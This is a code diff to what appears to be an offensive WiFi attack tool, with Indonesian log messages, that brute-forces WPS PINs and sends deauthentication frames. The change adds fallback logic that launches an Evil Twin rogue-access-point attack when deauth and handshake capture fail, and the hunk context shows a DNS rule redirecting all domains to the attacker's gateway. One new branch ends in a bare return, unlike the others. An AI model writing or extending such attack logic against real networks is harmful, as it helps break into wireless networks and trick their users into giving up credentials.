@@ -885,20 +885,33 @@ address=/#/192.168.1.1
                         continue
                     else:
                         print("[!] Deauth gagal, hentikan retry.")
-                        return False
+                        if self.evil_twin and bssid:
+                            print("[*] WPS and handshake failed. Launching Evil Twin attack...")
+                            channel = self._get_channel(bssid)
+                            essid = self.connection_status.essid or bssid
+                            if self._run_evil_twin(bssid, essid, channel, self.interface):
+                                return True
+                            else:
+                                return 
+                        else:
+                            print("[-] Deauth gagal, hentikan retry.")
+                            return False
+
                 else:
                     print("[-] Batas percobaan deauth tercapai. PIN mungkin salah atau AP terkunci permanen.")
                     if store_pin_on_fail:
                         self.__savePin(bssid, pin)
-                    
+                                    # Jika evil-twin diaktifkan, coba serangan Evil Twin
                     if self.evil_twin and bssid:
                         print("[*] WPS and handshake failed. Launching Evil Twin attack...")
                         channel = self._get_channel(bssid)
                         essid = self.connection_status.essid or bssid
                         if self._run_evil_twin(bssid, essid, channel, self.interface):
                             return True
-                   
-                    return False
+                        else:
+                            return False
+                    else:
+                        return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         """
